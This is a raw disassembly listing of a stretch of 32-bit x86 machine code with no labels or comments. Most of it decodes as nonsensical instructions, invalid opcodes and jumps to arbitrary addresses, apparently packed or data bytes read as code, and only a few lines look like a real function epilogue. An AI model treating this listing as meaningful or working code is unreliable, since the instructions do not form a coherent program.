  41c6ca:	adc    DWORD PTR [edi-0x55a969e8],edx
  41c6d0:	add    ah,dh
  41c6d2:	xchg   esi,eax
  41c6d3:	fcomp  QWORD PTR [ecx-0x70]
  41c6d6:	stos   DWORD PTR es:[edi],eax
  41c6d7:	xor    cl,BYTE PTR [edx-0x6b]
  41c6da:	scas   eax,DWORD PTR es:[edi]
  41c6db:	cwde   
  41c6dc:	enter  0xcd00,0x35
  41c6e0:	mov    dh,0x6d
  41c6e2:	jp     0x41c6b2
  41c6e4:	cld    
  41c6e5:	fldcw  WORD PTR [eax+0x29]
  41c6e8:	leave  
  41c6e9:	adc    bx,sp
  41c6ec:	ins    DWORD PTR es:[edi],dx
  41c6ed:	aas    
  41c6ee:	mov    ebx,DWORD PTR [edi+esi*1+0x5d400ea4]
  41c6f5:	into   
  41c6f6:	push   ebp
  41c6f7:	mov    bh,BYTE PTR [ebx]
  41c6f9:	ror    BYTE PTR [ebp+0xe],0x8e
  41c6fd:	sbb    eax,DWORD PTR [ebp-0x77]
  41c700:	mov    al,0xd6
  41c702:	fstp   TBYTE PTR [eax]
  41c704:	out    dx,al
  41c705:	sbb    ch,dh
  41c707:	ins    BYTE PTR es:[edi],dx
  41c708:	sub    eax,0x71aa3806
  41c70d:	mov    al,ds:0xd254bb25
  41c712:	out    dx,al
  41c713:	(bad)  
  41c714:	cmovae ebp,DWORD PTR [esi]
  41c717:	inc    ebp
  41c718:	fcom   QWORD PTR [ecx+ebx*1-0x23]
  41c71c:	sub    edi,DWORD PTR [ebp+0x5d]
  41c71f:	sbb    DWORD PTR [esi+0x3f4e46d2],esp
  41c725:	clc    
  41c726:	xchg   BYTE PTR [edx],cl
  41c728:	xchg   edi,eax
  41c729:	mov    ch,0xfc
  41c72b:	pop    ss
  41c72c:	xchg   ebp,eax
  41c72d:	or     BYTE PTR [edi-0x74020924],dh
  41c733:	pop    ds
  41c734:	call   FWORD PTR [edx+0x62]
  41c737:	test   eax,0xf6457010
  41c73c:	mov    cl,0x66
  41c73e:	popf   
  41c73f:	cmp    bh,BYTE PTR [esi]
  41c741:	ja     0x41c794
  41c743:	scas   eax,DWORD PTR es:[edi]
  41c744:	daa    
  41c745:	sbb    dh,bh
  41c747:	xchg   di,ax
  41c749:	mov    ds:0x7660e5db,al
  41c74e:	jne    0x41c6dd
  41c750:	fisub  DWORD PTR [edx+ebp*4-0x5e0ff2a2]
  41c757:	lea    edx,[ecx+0x59babfa1]
  41c75d:	mov    ds:0x7350cc1e,eax
  41c762:	inc    esp
  41c763:	(bad)  
  41c764:	or     al,0xf5
  41c766:	cmp    edx,DWORD PTR [edx+edx*1]
  41c769:	dec    eax
  41c76a:	js     0x41c717
  41c76c:	js     0x41c779
  41c76e:	daa    
  41c76f:	dec    ebx
  41c770:	push   ss
  41c771:	lock pop esp
  41c773:	mov    edx,0x4789310d
  41c778:	imul   edx
  41c77a:	test   BYTE PTR [eax-0x19],dl
  41c77d:	clc    
  41c77e:	mov    dh,0xe8
  41c780:	inc    ecx
  41c781:	add    DWORD PTR [edi-0x8],esi
  41c784:	sbb    edx,DWORD PTR [esi]
  41c786:	mov    ebx,DWORD PTR [edi+0x8]
  41c789:	leave  
  41c78a:	mov    edi,0xfe0d1e51
  41c78f:	jle    0x41c73f
  41c791:	cmp    eax,0x411761b9
  41c796:	cmp    DWORD PTR [ecx+0x35],ecx
  41c799:	cdq    
  41c79a:	or     esi,DWORD PTR [esi-0x32f530e5]
  41c7a0:	push   ebx
  41c7a1:	es jmp 0x4b9ee001
  41c7a7:	retf   
  41c7a8:	xor    eax,ecx
  41c7aa:	aaa    
  41c7ab:	out    0xa4,eax
  41c7ad:	jb     0x41c7ef
  41c7af:	std    
  41c7b0:	add    BYTE PTR [esi+edx*1+0x2b],bl
  41c7b4:	fs out dx,eax
  41c7b6:	into   
  41c7b7:	(bad)  
  41c7b8:	lods   al,BYTE PTR ds:[esi]
  41c7b9:	and    bh,bl
  41c7bb:	aam    0x3c
  41c7bd:	arpl   WORD PTR [edx],si
  41c7bf:	out    0x45,eax
  41c7c1:	je     0x41c7aa
  41c7c3:	add    DWORD PTR [edi],ecx
  41c7c5:	lea    edx,[eax]
  41c7c7:	das    
  41c7c8:	jecxz  0x41c811
  41c7ca:	adc    BYTE PTR [edx+0x7],dl
  41c7cd:	loopne 0x41c78e
  41c7cf:	lock retf 0xba70
  41c7d3:	mov    bl,BYTE PTR ds:0xbe167831
  41c7d9:	or     al,0x87
  41c7db:	jo     0x41c7ba
  41c7dd:	arpl   WORD PTR [esi-0x49],cx
  41c7e0:	dec    esp
  41c7e1:	into   
  41c7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7e3:	jne    0x41c7a6
  41c7e5:	and    DWORD PTR [edx+eax*8+0x3090e437],0x65bb1f9f
  41c7f0:	or     eax,0xafdcbd91
  41c7f5:	sub    al,0xa7
  41c7f7:	add    al,0xd4
  41c7f9:	cmp    eax,0x501b1692
  41c7fe:	scas   eax,DWORD PTR es:[edi]
  41c7ff:	and    dl,BYTE PTR [edi]
  41c801:	retf   0x6336
  41c804:	sub    BYTE PTR ds:0x28171ab5,cl
  41c80a:	shr    DWORD PTR [ebx+0x6fbdb122],0x43
  41c811:	repz lds ebx,FWORD PTR [edi-0x1a]
  41c815:	test   al,0x63
  41c817:	ins    BYTE PTR es:[edi],dx
  41c818:	xchg   edi,eax
  41c819:	aas    
  41c81a:	ja     0x41c863
  41c81c:	dec    eax
  41c81d:	pushf  
  41c81e:	xor    eax,0xec4984e5
  41c823:	mov    dl,0x77
  41c825:	push   es
  41c826:	cmp    BYTE PTR [esi],al
  41c828:	test   al,0x3b
  41c82a:	(bad)  
  41c82b:	xor    DWORD PTR [eax+0x384bdbe4],ebx
  41c831:	cmp    BYTE PTR [ecx-0x29],0x2b
  41c835:	out    dx,eax
  41c836:	imul   ebx,DWORD PTR [ebx-0x21],0xffffff80
  41c83a:	pop    es
  41c83b:	sub    BYTE PTR [ecx+0x1d50237e],ch
  41c841:	test   al,0x9c
  41c843:	dec    esi
  41c844:	shr    bh,1
  41c846:	jmp    0x7a69:0x7974392b
  41c84d:	fnsave [edi]
  41c84f:	inc    ebp
  41c850:	in     al,0x45
  41c852:	push   edx
  41c853:	or     al,bl
  41c855:	and    BYTE PTR [edi+eiz*4-0x1005573],bh
  41c85c:	xor    ebp,ebx
  41c85e:	stos   BYTE PTR es:[edi],al
  41c85f:	add    ebp,esp
  41c861:	inc    eax
  41c862:	shl    BYTE PTR [ecx+0x49bfd586],cl
  41c868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c869:	cs inc esp
  41c86b:	clc    
  41c86c:	push   0xd22d0efa
  41c871:	and    eax,0x78e23bb1
  41c876:	pop    ebp
  41c877:	jmp    0x41c84e
  41c879:	add    al,cl
  41c87b:	sub    ebx,ebp
  41c87d:	push   cs
  41c87e:	mov    edi,0xc71fd8a
  41c883:	xchg   ch,al
  41c885:	in     al,0xc7
  41c887:	pop    ss
  41c888:	std    
  41c889:	inc    edi
  41c88a:	xchg   dh,bl
  41c88c:	xchg   DWORD PTR ds:0x5aee9601,edi
  41c892:	frstor [edx]
  41c894:	shl    esp,1
  41c896:	js     0x41c8ad
  41c898:	add    BYTE PTR ds:0x56dd5401,0x3
  41c89f:	ror    DWORD PTR [ebx-0x50f0f3b3],0xc1
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xd79688e2
  41c8c2:	shl    BYTE PTR [edi+ebp*4-0x7b],cl
  41c8c6:	add    DWORD PTR [eax],eax
  41c8c8:	lods   eax,DWORD PTR ds:[esi]
  41c8c9:	add    BYTE PTR [eax],al
  41c8cb:	add    BYTE PTR [esi],dh
  41c8cd:	sbb    bl,0x93
  41c8d0:	dec    edx
  41c8d1:	ss jge 0x41c862
  41c8d4:	mov    eax,0x65051a4e
  41c8d9:	pop    ecx
  41c8da:	dec    esi
  41c8db:	ins    BYTE PTR es:[edi],dx
  41c8dc:	(bad)  
  41c8dd:	xchg   esi,eax
  41c8de:	mov    edx,0xf92ba0f4
  41c8e3:	(bad)  
  41c8e4:	lock enter 0xb405,0x90
  41c8e9:	inc    ebp
  41c8ea:	mov    esi,0xdfae7e91
  41c8ef:	rol    BYTE PTR [edx+ebp*1+0xe7bf984],1
  41c8f6:	popf   
  41c8f7:	cdq    
  41c8f8:	jecxz  0x41c916
  41c8fa:	in     al,0x4
  41c8fc:	iret   
  41c8fd:	inc    BYTE PTR [ebx+0x160e4d9c]
  41c903:	adc    ch,ah
  41c905:	bound  ebp,QWORD PTR [edi]
  41c907:	mov    esp,0xa5aaa919
  41c90c:	or     DWORD PTR [edi-0xf316e3b],edi
  41c912:	lods   eax,DWORD PTR ds:[esi]
  41c913:	mov    al,ds:0x58d65348
  41c918:	outs   dx,BYTE PTR ds:[esi]
  41c919:	test   DWORD PTR ds:0xb1ff0746,esi
  41c91f:	adc    ah,BYTE PTR [ecx]
  41c921:	or     ch,BYTE PTR [eax-0x2b]
  41c924:	pop    eax
  41c925:	xchg   ecx,eax
  41c926:	mov    DWORD PTR [esi],0x3be9ef06
  41c92c:	shr    esi,0x36
  41c92f:	xor    al,0xb
  41c931:	cmp    DWORD PTR [bx],0xfe7b27a8
  41c938:	stos   DWORD PTR es:[edi],eax
  41c939:	ins    DWORD PTR es:[edi],dx
  41c93a:	leave  
  41c93b:	xchg   ecx,eax
  41c93c:	xchg   edx,eax
  41c93d:	dec    ebp
  41c93e:	mov    fs,WORD PTR [ebp+0x75]
  41c941:	out    dx,eax
  41c942:	and    BYTE PTR [edx],dh
  41c944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c945:	jge    0x41c8e0
  41c947:	push   ecx
  41c948:	bound  esp,QWORD PTR [esi]
  41c94a:	push   0xc09216bf
  41c94f:	nop
  41c950:	push   cs
  41c951:	in     eax,0x90
  41c953:	sub    eax,0xfffffffd
  41c956:	add    eax,0x7125e8e6
  41c95b:	ins    DWORD PTR es:[edi],dx
  41c95c:	(bad)  
  41c95d:	jmp    0x41c94e
  41c95f:	fs dec ebp
  41c961:	push   esp
  41c962:	cmp    BYTE PTR [edi],dl
  41c964:	popa   
  41c965:	fadd   DWORD PTR [edx+0x69]
  41c968:	cmp    al,0x29
  41c96a:	and    eax,0x3bf3b33b
  41c96f:	cs js  0x41c8f5
  41c972:	popa   
  41c973:	push   esi
  41c974:	test   BYTE PTR [esp+ebp*1+0x7261],bl
	...
  41c983:	add    cl,dl
  41c985:	sub    al,0x14
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x34fb6d7
  41c994:	pop    esp
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [ebp+0x77000000],ch
  41c99d:	mov    edi,0xa7491a16
  41c9a2:	out    dx,eax
  41c9a3:	and    eax,DWORD PTR [ebx+edi*2]
  41c9a6:	je     0x41ca1b
  41c9a8:	inc    ecx
  41c9a9:	mov    ch,0x8e
  41c9ab:	dec    eax
  41c9ac:	inc    esp
  41c9ad:	inc    edi
  41c9ae:	xor    ax,cx
  41c9b1:	jg     0x41ca03
  41c9b3:	fild   WORD PTR [eax-0x663a9a2c]
  41c9b9:	pop    edi
  41c9ba:	jl     0x41c951
  41c9bc:	pop    es
  41c9bd:	ins    DWORD PTR es:[edi],dx
  41c9be:	into   
  41c9bf:	test   DWORD PTR [edi+0x360f3b25],edx
  41c9c5:	int    0xd8
  41c9c7:	test   BYTE PTR [edi+0x45],al
  41c9ca:	mov    eax,ds:0x1b41de13
  41c9cf:	push   edi
  41c9d0:	cmp    ch,BYTE PTR [edx-0x223e8db0]
  41c9d6:	pop    ss
  41c9d7:	mov    edi,0xfbc45f88
  41c9dc:	dec    edi
  41c9dd:	mov    cs,WORD PTR [ecx+0x444c60c0]
  41c9e3:	lock push edx
  41c9e5:	or     BYTE PTR [eax-0x1b],0x2e
  41c9e9:	ret    
  41c9ea:	jmp    0x41ca6b
  41c9ec:	pop    DWORD PTR [esi-0x2f]
  41c9ef:	std    
  41c9f0:	shl    DWORD PTR [edx+0xfd0cb89],1
  41c9f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9f7:	cmp    ebx,DWORD PTR [eax-0x5dbfa626]
  41c9fd:	mov    cl,0x1c
  41c9ff:	mov    bh,0x96
  41ca01:	mov    DWORD PTR [edx+0x1521b20c],edx
  41ca07:	fadd   QWORD PTR [edi+0x103d61b0]
  41ca0d:	xchg   edi,eax
  41ca0e:	jns    0x41c993
  41ca10:	xlat   BYTE PTR ds:[ebx]
  41ca11:	int3   
  41ca12:	dec    edx
  41ca13:	add    BYTE PTR [edx],ch
  41ca15:	mov    bh,0x57
  41ca17:	(bad)  
  41ca18:	xchg   ecx,eax
  41ca19:	inc    eax
  41ca1a:	jg     0x41c9dc
  41ca1c:	mov    DWORD PTR [ecx+0x4c],edx
  41ca1f:	sbb    al,bl
  41ca21:	ret    
  41ca22:	pop    es
  41ca23:	cpuid  
  41ca25:	pop    esi
  41ca26:	jne    0x41c9e4
  41ca28:	inc    ebx
  41ca29:	adc    bh,BYTE PTR [esi]
  41ca2b:	fnsave [ecx-0x24b7e7f6]
  41ca31:	test   bl,cl
  41ca33:	or     al,0xbf
  41ca35:	mov    ebp,0x725f4d94
  41ca3a:	loopne 0x41c9c9
  41ca3c:	jmp    0x929ee2f4
  41ca41:	cmp    ah,bh
  41ca43:	jae    0x41ca63
  41ca45:	push   esi
  41ca46:	std    
  41ca47:	test   al,0xb3
	...
  41ca51:	add    BYTE PTR [eax],al
  41ca53:	add    BYTE PTR [edi],bl
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2-0x5f976628],0x9
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [ebp-0x25000000],ch
  41ca6d:	or     BYTE PTR [ecx+0x40a0aee4],bh
  41ca73:	xchg   eax,edx
  41ca75:	stos   DWORD PTR es:[edi],eax
  41ca76:	and    BYTE PTR [esi],dl
  41ca78:	and    eax,0x524b51bf
  41ca7d:	neg    ch
  41ca7f:	test   al,0xae
  41ca81:	test   ebx,0x7de79fc7
  41ca87:	bound  edx,QWORD PTR [ebp-0x61]
  41ca8a:	loope  0x41ca9c
  41ca8c:	add    cl,BYTE PTR cs:[ebx+eiz*8-0x4c5f9201]
  41ca94:	aaa    
  41ca95:	inc    eax
  41ca96:	stos   BYTE PTR es:[edi],al
  41ca97:	add    edx,eax
  41ca99:	mov    edi,0x746138a4
  41ca9e:	and    eax,0xa8534f7b
  41caa3:	cli    
  41caa4:	cmc    
  41caa5:	dec    ebp
  41caa6:	push   DWORD PTR [edi+ebp*2]
  41caa9:	(bad)  
  41caaa:	or     BYTE PTR ss:[edx+0x5c],bh
  41caae:	xchg   ecx,eax
  41caaf:	pop    ds
  41cab0:	dec    ecx
  41cab1:	rcl    BYTE PTR [ebx],0x1a
  41cab4:	adc    BYTE PTR [ecx-0x21],bl
  41cab7:	mov    edx,0xad0b5e80
  41cabc:	call   0x7c4:0x3d10bb40
  41cac3:	xlat   BYTE PTR ds:[ebx]
  41cac4:	sbb    eax,ecx
  41cac6:	fsub   DWORD PTR [ebp-0x74184397]
  41cacc:	(bad)  
  41cacd:	mov    ch,0x82
  41cacf:	aam    0x14
  41cad1:	(bad)  
  41cad2:	sbb    al,0x1a
  41cad4:	test   esp,ebx
  41cad6:	popf   
  41cad7:	cmp    eax,0xaf8461f4
  41cadc:	adc    cl,BYTE PTR [esi+0x322e01bb]
  41cae2:	fistp  WORD PTR [esp+edx*8-0x71400f9e]
  41cae9:	fst    DWORD PTR [ebp+0x75]
  41caec:	jl     0x41cacf
  41caee:	cmp    ah,al
  41caf0:	imul   ecx,esp,0xa23caccb
  41caf6:	push   esp
  41caf7:	push   esi
  41caf8:	jb     0x41cb12
  41cafa:	mov    al,ds:0xe6d497a4
  41caff:	sub    eax,DWORD PTR [ecx-0x1152c86d]
  41cb05:	test   DWORD PTR [edi+0x6f],eax
  41cb08:	push   edx
  41cb09:	sbb    DWORD PTR [ecx+0x2e15b929],ebx
  41cb0f:	aaa    
  41cb10:	push   eax
  41cb11:	(bad)  
  41cb13:	xor    eax,0x61eaae7a
  41cb18:	inc    eax
	...
  41cb21:	add    BYTE PTR [eax],al
  41cb23:	add    BYTE PTR [edi],ch
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	push   ebx
  41cb31:	retf   0xf964
  41cb34:	mov    dh,0x87
  41cb36:	add    DWORD PTR [eax],eax
  41cb38:	lods   eax,DWORD PTR ds:[esi]
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [edx+0x247a871a],bl
  41cb41:	aad    0x83
  41cb43:	mov    esp,0xebdb3db9
  41cb48:	mov    cl,0x7f
  41cb4a:	adc    ecx,DWORD PTR [ebp+ecx*8+0x7a]
  41cb4e:	nop
  41cb4f:	jb     0x41cb62
  41cb51:	sti    
  41cb52:	call   0xe8a81344
  41cb57:	xor    al,0xfe
  41cb59:	add    BYTE PTR [eax],bl
  41cb5b:	fmulp  st(0),st
  41cb5d:	outs   dx,DWORD PTR ds:[esi]
  41cb5e:	hlt    
  41cb5f:	xchg   esi,eax
  41cb60:	cmp    al,BYTE PTR [eax]
  41cb62:	test   eax,0x38b2b83
  41cb67:	rcr    BYTE PTR cs:[eax],0xa8
  41cb6b:	push   cs
  41cb6c:	jge    0x41cba7
  41cb6e:	sub    BYTE PTR [edx+eax*4-0x8e3930b],dl
  41cb75:	jl     0x41cba4
  41cb77:	mov    BYTE PTR [esi-0x6ba63419],dh
  41cb7d:	(bad)  
  41cb7e:	xor    BYTE PTR [eax+ebp*2+0x6d],bl
  41cb82:	imul   edx,eax,0xffffffea
  41cb85:	add    al,0x81
  41cb87:	outs   dx,BYTE PTR ds:[esi]
  41cb89:	jbe    0x41cb98
  41cb8b:	imul   ecx,DWORD PTR [esi],0x88697336
  41cb91:	inc    ebp
  41cb92:	out    0x75,eax
  41cb94:	repz dec ebp
  41cb96:	js     0x41cb88
  41cb98:	jecxz  0x41cbd1
  41cb9a:	ror    BYTE PTR [ebp+0x1d],0x5
  41cb9e:	mov    esi,0x49f468b0
  41cba3:	sbb    al,0xce
  41cba5:	dec    edx
  41cba6:	das    
  41cba7:	jg     0x41cbb5
  41cba9:	pop    ss
  41cbaa:	xchg   ebp,eax
  41cbab:	retf   0x482b
  41cbae:	mov    BYTE PTR [edi+esi*2+0x49d1782f],dh
  41cbb5:	mov    BYTE PTR [ebx-0x3d],ch
  41cbb8:	js     0x41cb60
  41cbba:	idiv   DWORD PTR [eax-0x422421f7]
  41cbc0:	call   0x31ed:0xb3db6641
  41cbc7:	fwait
  41cbc8:	push   ebp
  41cbc9:	jbe    0x41cb54
  41cbcb:	test   BYTE PTR [eax+0x2c9f90f3],ah
  41cbd1:	mov    cl,0xc
  41cbd3:	ror    ch,1
  41cbd5:	rcl    DWORD PTR [edx+0x62],0xbb
  41cbd9:	fcmovne st,st(2)
  41cbdb:	test   BYTE PTR [edi+0x43],bl
  41cbde:	mov    ch,0xb5
  41cbe0:	aam    0x94
  41cbe2:	xor    eax,eax
  41cbe4:	sti    
  41cbe5:	inc    ebx
  41cbe6:	aad    0x24
  41cbe8:	or     al,BYTE PTR [eax]
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	retf   0x76a0
  41cbf7:	dec    ebp
  41cbf8:	jle    0x41cbd9
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x53de8b9e,al
  41cc04:	arpl   WORD PTR [eax+0xad0001],cx
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	sub    ah,al
  41cc0e:	aas    
  41cc0f:	or     al,0xd7
  41cc11:	push   esi
  41cc12:	das    
  41cc13:	xchg   edi,eax
  41cc14:	fstp   QWORD PTR [ecx-0x4ddb62c7]
  41cc1a:	test   ebp,0x45a26c01
  41cc20:	leave  
  41cc21:	or     dl,dh
  41cc23:	shr    al,cl
  41cc25:	sbb    DWORD PTR [eax+0x27],edx
  41cc28:	xor    al,0x50
  41cc2a:	dec    edx
  41cc2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc2c:	fld    QWORD PTR [eax+0x61]
  41cc2f:	jg     0x41cc4c
  41cc31:	push   0x56cb626c
  41cc36:	int    0xe
  41cc38:	sub    edx,ebx
  41cc3a:	xlat   BYTE PTR ds:[ebx]
  41cc3b:	or     cl,BYTE PTR [bx+si+0x5429]
  41cc40:	mov    dh,0x6f
  41cc42:	scas   eax,DWORD PTR es:[di]
  41cc44:	call   0xd5cb:0x850de151
  41cc4b:	xchg   esp,eax
  41cc4c:	lods   al,BYTE PTR ds:[esi]
  41cc4d:	mov    al,ds:0x6a05e80b
  41cc52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc53:	or     ebx,DWORD PTR [ecx+esi*8+0x6c]
  41cc57:	pushf  
  41cc58:	push   esi
  41cc59:	stos   DWORD PTR es:[edi],eax
  41cc5a:	xchg   esp,eax
  41cc5b:	mov    ds:0xd46c00aa,al
  41cc60:	into   
  41cc61:	(bad)  
  41cc62:	mov    ch,0x99
  41cc64:	aas    
  41cc65:	mov    BYTE PTR [edx+0x5447183b],ah
  41cc6b:	mov    es,WORD PTR [edi+0x594b464f]
  41cc71:	scas   eax,DWORD PTR es:[edi]
  41cc72:	rol    BYTE PTR [edx+edx*2+0x4774dede],1
  41cc79:	imul   BYTE PTR [eax+ebx*4]
  41cc7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc7d:	das    
  41cc7e:	push   eax
  41cc7f:	push   eax
  41cc80:	aad    0xf2
  41cc82:	lock jl 0x41cc76
  41cc85:	pop    edi
  41cc86:	ins    BYTE PTR es:[edi],dx
  41cc87:	push   ds
  41cc88:	sahf   
  41cc89:	mov    dh,0x6f
  41cc8b:	sub    al,0xd7
  41cc8d:	ins    DWORD PTR es:[edi],dx
  41cc8e:	lock sbb ebp,DWORD PTR [ebp-0x50739415]
  41cc95:	mov    eax,ds:0xe852e7c5
  41cc9a:	cli    
  41cc9b:	sub    DWORD PTR [ebx+edi*1],edi
  41cc9e:	rcl    BYTE PTR [edi+ecx*8],cl
  41cca1:	popf   
  41cca2:	fiadd  DWORD PTR [ebx-0x7d8b58ea]
  41cca8:	and    al,0x19
  41ccaa:	mov    ch,0xe8
  41ccac:	sbb    dl,BYTE PTR [esp+edx*2+0x10]
  41ccb0:	dec    ecx
  41ccb1:	aaa    
  41ccb2:	fnstsw WORD PTR [eax+0x4b]
  41ccb5:	mov    edx,DWORD PTR [eax+ebx*2+0x39]
	...
  41ccc4:	(bad)  
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	rcl    DWORD PTR [eax-0x76ef5d07],cl
  41ccd6:	add    DWORD PTR [eax],eax
  41ccd8:	lods   eax,DWORD PTR ds:[esi]
  41ccd9:	add    BYTE PTR [eax],al
  41ccdb:	add    al,dl
  41ccdd:	or     eax,0x5f5e6ec0
  41cce2:	inc    DWORD PTR [ebp+0x3c10adc6]
  41cce8:	push   es
  41cce9:	rcl    BYTE PTR [eax-0x4058202f],1
  41ccef:	stc    
  41ccf0:	ins    BYTE PTR es:[edi],dx
  41ccf1:	sbb    DWORD PTR [eax-0x1a890583],edi
  41ccf7:	fcom   QWORD PTR [ebx]
  41ccf9:	outs   dx,DWORD PTR ds:[esi]
  41ccfa:	add    al,0x72
  41ccfc:	gs or  al,0xa4
  41ccff:	mov    esi,DWORD PTR [ebx]
  41cd01:	jae    0x41cc8e
  41cd03:	cmp    bl,bl
  41cd05:	inc    edi
  41cd06:	jmp    0x7f054795
  41cd0b:	xchg   esi,eax
  41cd0c:	and    al,0x87
  41cd0e:	pushf  
  41cd0f:	stc    
  41cd10:	ins    BYTE PTR es:[edi],dx
  41cd11:	lock fnstcw WORD PTR [ecx-0x69]
  41cd15:	(bad)  
  41cd16:	pop    es
  41cd17:	sub    BYTE PTR [esi],ch
  41cd19:	mov    es,ebp
  41cd1b:	mov    ecx,0x53920dd0
  41cd20:	dec    ebx
  41cd21:	in     eax,0x11
  41cd23:	or     al,0x4c
  41cd25:	(bad)  
  41cd26:	ror    BYTE PTR [ecx+0x6c4837d3],0xe1
  41cd2d:	int3   
  41cd2e:	or     eax,0xa284b94
  41cd33:	xor    bl,dh
  41cd35:	inc    edx
  41cd36:	dec    esp
  41cd37:	push   cs
  41cd38:	test   eax,0xe9df76b0
  41cd3d:	fstp   TBYTE PTR [ebx-0x46]
  41cd40:	shr    BYTE PTR [esi],cl
  41cd42:	stos   DWORD PTR es:[edi],eax
  41cd43:	cmp    eax,0x2064fdd5
  41cd48:	fcomp  QWORD PTR [edi-0x22]
  41cd4b:	pop    ebx
  41cd4c:	hlt    
  41cd4d:	inc    ecx
  41cd4e:	inc    ebx
  41cd4f:	dec    esp
  41cd50:	xchg   esi,eax
  41cd51:	leave  
  41cd52:	xor    eax,0xde7475ac
  41cd57:	xor    BYTE PTR [ecx+ebp*2-0x35],dl
  41cd5b:	call   0x5e7ce195
  41cd60:	mov    eax,ds:0xa5bac74b
  41cd65:	and    al,0x35
  41cd67:	sub    ah,BYTE PTR [ebp-0x116b2858]
  41cd6d:	mov    ds:0xd3894039,eax
  41cd72:	mov    ebx,0x6f43b152
  41cd77:	outs   dx,DWORD PTR ds:[esi]
  41cd78:	fsub   st,st(5)
  41cd7a:	jmp    0xe2345
  41cd7f:	jl     0x41cd9a
  41cd81:	test   eax,0x3537d83
  41cd86:	lds    esp,FWORD PTR [edx]
  41cd88:	aas    
	...
  41cd91:	add    BYTE PTR [eax],al
  41cd93:	add    BYTE PTR [edx+0x34],dl
  41cd96:	inc    eax
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0xe06a4e09
  41cda1:	fiadd  WORD PTR [ebx+0x44]
  41cda4:	mov    ebp,0xad000189
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR [edx+0x78],cl
  41cdae:	sbb    ebp,esi
  41cdb0:	call   0x62ba:0xd5052d17
  41cdb7:	xchg   esp,eax
  41cdb8:	clc    
  41cdb9:	ss inc ebp
  41cdbb:	icebp  
  41cdbc:	mov    esp,DWORD PTR [eax]
  41cdbe:	imul   edx,DWORD PTR [ecx-0x68],0x4a
  41cdc2:	lock or DWORD PTR [edi+0x32a0b1f8],ebx
  41cdc9:	xor    BYTE PTR [edi],bl
  41cdcb:	mov    DWORD PTR [ebp+0x1d],edi
  41cdce:	aaa    
  41cdcf:	add    dl,BYTE PTR [ebp-0x33]
  41cdd2:	stos   BYTE PTR es:[edi],al
  41cdd3:	push   cs
  41cdd4:	sub    al,BYTE PTR [ebx-0x27]
  41cdd7:	lock outs dx,BYTE PTR ds:[esi]
  41cdd9:	pop    ebp
  41cdda:	fisub  WORD PTR [edx]
  41cddc:	int3   
  41cddd:	out    dx,al
  41cdde:	sub    BYTE PTR ds:0x2edc93d1,dh
  41cde4:	jmp    FWORD PTR [edx+0x19]
  41cde7:	outs   dx,BYTE PTR ds:[esi]
  41cde8:	es int3 
  41cdea:	xlat   BYTE PTR ds:[ebx]
  41cdeb:	pop    edx
  41cdec:	mov    WORD PTR [ebp+0x23130076],fs
  41cdf2:	mov    bl,0x45
  41cdf5:	cli    
  41cdf6:	push   ss
  41cdf7:	mov    edi,0x38c97a43
  41cdfc:	mov    BYTE PTR [edi-0x15337e4c],ah
  41ce02:	out    dx,eax
  41ce03:	mov    al,ds:0x1690585c
  41ce08:	retf   
  41ce09:	mov    ebp,esi
  41ce0b:	adc    eax,0x182dfc77
  41ce10:	jb     0x41ce51
  41ce12:	sbb    bh,BYTE PTR [esi+0x47a5b9fe]
  41ce18:	shl    DWORD PTR [eax-0x6d],0x56
  41ce1c:	ficom  DWORD PTR [edx-0x12]
  41ce1f:	sbb    al,0xe
  41ce21:	add    dl,BYTE PTR [ebx+ebx*8]
  41ce24:	repnz inc ecx
  41ce26:	add    DWORD PTR [edi],esp
  41ce28:	or     DWORD PTR [ebp-0x17],esp
  41ce2b:	mov    al,0xe1
  41ce2d:	mov    ecx,0xc16ef5e5
  41ce32:	stc    
  41ce33:	lock adc DWORD PTR [ebp-0x53],edx
  41ce37:	add    DWORD PTR [ebp+0x5db28b2b],ebp
  41ce3d:	das    
  41ce3e:	imul   BYTE PTR [edi-0x6db5228]
  41ce44:	lods   eax,DWORD PTR ds:[esi]
  41ce45:	ds stos DWORD PTR es:[edi],eax
  41ce47:	mov    esi,0x199d9537
  41ce4c:	lods   eax,DWORD PTR ds:[esi]
  41ce4d:	push   esi
  41ce4e:	lock jb 0x41cea0
  41ce51:	push   esp
